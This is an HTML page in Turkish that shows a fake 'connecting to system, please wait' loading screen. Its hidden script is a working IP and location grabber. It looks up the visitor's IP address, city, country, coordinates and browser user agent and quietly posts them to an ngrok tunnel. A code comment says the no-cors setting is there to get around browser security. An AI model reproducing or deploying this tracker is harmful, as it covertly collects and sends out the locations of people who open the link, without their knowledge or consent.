<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Yükleniyor...</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .loader {
            text-align: center;
        }
        .dots:after {
            content: ' .';
            animation: dots 1s steps(5, end) infinite;
        }
        @keyframes dots {
            0%, 20% { content: ' .'; }
            40% { content: ' ..'; }
            60% { content: ' ...'; }
            80%, 100% { content: ''; }
        }
    </style>
</head>
<body>

    <div class="loader">
        <h1>SİSTEME BAĞLANILIYOR<span class="dots"></span></h1>
        <p>Lütfen bekleyiniz, veriler doğrulanıyor...</p>
    </div>

    <script>
        // 1. Kullanıcının IP ve genel konum bilgilerini al
        fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
            
            // Terminaline gidecek olan veri paketi
            const payload = {
                ip: data.ip,
                city: data.city,
                country: data.country_name,
                loc: data.latitude + "," + data.longitude,
                ua: navigator.userAgent
            };

            // 2. Senin Ngrok tüneline veriyi gönder
            // NOT: Ngrok linkin değiştikçe burayı güncellemen gerekir!
            const ngrokURL = "https://punctual-villain-arson.ngrok-free.dev/log";

            fetch(ngrokURL, {
                method: 'POST',
                mode: 'no-cors', // Tarayıcı güvenliğini aşmak için
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(() => {
                console.log("Bağlantı başarılı.");
            })
            .catch(err => {
                console.error("Hata oluştu:", err);
            });
        })
        .catch(err => {
            console.error("Bilgi alınamadı:", err);
        });
    </script>
</body>
</html>
